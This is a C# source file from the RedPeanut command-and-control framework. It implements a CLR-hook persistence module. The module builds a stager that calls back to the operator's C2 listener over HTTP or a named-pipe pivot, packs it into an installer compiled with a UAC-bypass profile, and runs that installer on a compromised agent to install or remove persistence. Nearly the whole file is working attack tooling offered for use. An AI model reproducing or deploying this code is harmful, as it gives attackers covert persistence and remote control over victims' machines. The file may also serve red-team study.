//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using static RedPeanut.Models;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class PersCLRManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set process", "Parent process" },
            { "set uninstall", "Partial uninstallation. Restore the environment variable, but the assembly must be deleted manually." },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "clr";
        string process = "";
        bool uninstall = false;
        //bool ssl = true;
        bool exit = false;

        public PersCLRManager()
        {

        }

        public PersCLRManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                PersCLRMenu(input);
            } while (!exit);
        }

        private void PersCLRMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set process":
                            process = GetParsedSetString(input);
                            break;
                        case "set uninstall":
                            uninstall = GetParsedSetBool(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            try
            {
                string host = ((AgentInstanceHttp)agent).GetAddress();
                int port = ((AgentInstanceHttp)agent).GetPort();
                int profileid = ((AgentInstanceHttp)agent).GetProfileid();
                int targetframework = ((AgentInstanceHttp)agent).TargetFramework;
                string pipename = "";

                if (!string.IsNullOrEmpty(process))
                {
                    if (agent.Pivoter != null)
                    {
                        host = agent.Pivoter.SysInfo.Ip;
                        port = 0;
                        profileid = RedPeanutC2.server.GetDefaultProfile();
                        targetframework = agent.TargetFramework;
                        pipename = agent.AgentId;
                    }
                    else
                    {
                        host = ((AgentInstanceHttp)agent).GetAddress();
                        port = ((AgentInstanceHttp)agent).GetPort();
                        profileid = ((AgentInstanceHttp)agent).GetProfileid();
                        targetframework = agent.TargetFramework;
                    }

                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profileid))
                    {
                        string source;

                        if (string.IsNullOrEmpty(pipename))
                        {
                            //Http no pivot stager
                            ListenerConfig conf = new ListenerConfig("", host, port, Program.GetC2Manager().GetC2Server().GetProfile(profileid), profileid);
                            source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), targetframework, conf);
                        }
                        else
                        {
                            //NamedPipe enable stager
                            ListenerPivotConfig conf = new ListenerPivotConfig("", host, pipename, Program.GetC2Manager().GetC2Server().GetProfile(profileid));
                            source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), targetframework, conf);
                        }

                        string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework)));
                        
                        string hookfilename = RandomAString(10, new Random()) + ".dll";
                        //string clrhook = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, hookfilename, targetframework, compprofile: CompilationProfile.PersistenceCLR)));

                        string keyfilename = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, KEYFILE_FOLDER, "key.snk");

                        source = File.ReadAllText(Path.Combine(folderrpath, CLRHOOKINSTALL_TEMPLATE))
                            .Replace("#KEYFILE#", Convert.ToBase64String(CompressGZipAssembly(File.ReadAllBytes(keyfilename))))
                            .Replace("#STAGER#", stagerstr)
                            .Replace("#FILENAME#", hookfilename)
                            .Replace("#PROCESS#", process);

                        string clrhookinstaller = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework, compprofile: CompilationProfile.UACBypass)));

                        if(uninstall)
                            RunAssemblyBase64(clrhookinstaller,"PersCLRInstall", new string[] { "cleanenv" },agent);
                        else
                            RunAssemblyBase64(clrhookinstaller, "PersCLRInstall", new string[] { "install" }, agent);
                    }
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Errore generating task");
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "process", process },
                { "delete", uninstall.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
